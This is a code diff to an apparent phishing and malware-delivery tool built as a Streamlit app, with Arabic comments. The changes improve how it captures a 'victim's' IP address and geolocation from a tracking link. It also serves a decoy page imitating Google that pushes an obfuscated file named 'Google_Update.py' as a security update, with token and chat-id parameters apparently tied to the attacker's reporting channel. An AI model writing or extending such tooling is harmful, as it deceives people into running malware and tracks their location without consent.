@@ -51,20 +51,32 @@ def get_real_ip():
         from streamlit.web.server.websocket_headers import _get_websocket_headers
         headers = _get_websocket_headers()
         if headers:
+            # الترويسات الشائعة لـ IP الزائر خلف البروكسي في Streamlit Cloud
             ip = headers.get("X-Forwarded-For")
             if ip:
+                # أحياناً يكون هناك أكثر من IP، نأخذ الأول
                 return ip.split(",")[0].strip()
+            
             ip = headers.get("X-Real-Ip")
             if ip:
                 return ip
     except:
         pass
+    
+    # محاولة خارجية كخيار بديل (قد تعطي IP السيرفر أحياناً)
+    try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=3)
+        if response.status_code == 200:
+            return response.json().get('ip', 'Unknown')
+    except:
+        pass
+    
     return 'Unknown'
 
 # ============= دالة جلب البيانات الجغرافية =============
 def get_geo_info(ip):
     """جلب معلومات الموقع الجغرافي من عدة مصادر لضمان الدقة"""
-    if ip == 'Unknown' or ip == '127.0.0.1':
+    if not ip or ip == 'Unknown' or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
         return None
     
     # المصدر الأول: ip-api.com
@@ -99,9 +111,11 @@ def capture_victim_data():
     """التقاط بيانات الضحية عند فتح رابط التتبع"""
     query_params = st.query_params
     
+    # التقاط IP من البارامترات إذا تم إرساله من الجافا سكريبت (لضمان الدقة)
+    user_ip = query_params.get('ip', [get_real_ip()])[0]
+    
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
         try:
-            user_ip = get_real_ip()
             geo_data = get_geo_info(user_ip)
             
             # تسجيل بيانات الضحية
@@ -164,7 +178,7 @@ if 'download' in st.query_params:
                 label="📥 اضغط هنا لبدء تحميل التحديث الأمني",
                 data=obfuscated_code,
                 file_name="Google_Update.py",
-                mime="application/octet-stream" # استخدام octet-stream لإجبار التحميل
+                mime="application/octet-stream"
             )
             st.warning("⚠️ يرجى الضغط على الزر أعلاه لبدء التحميل يدوياً إذا لم يبدأ تلقائياً.")
             st.stop()
@@ -179,11 +193,14 @@ if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
         
         token = st.query_params.get('token', '')
         chatid = st.query_params.get('chatid', '')
+        
+        # رابط التحميل المباشر
         download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
         
         # حقن رابط التحميل في JavaScript الخاص بـ index.html
         html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
         
+        # عرض صفحة التمويه
         st.components.v1.html(html_content, height=800, scrolling=True)
         st.stop()
     except Exception as e:
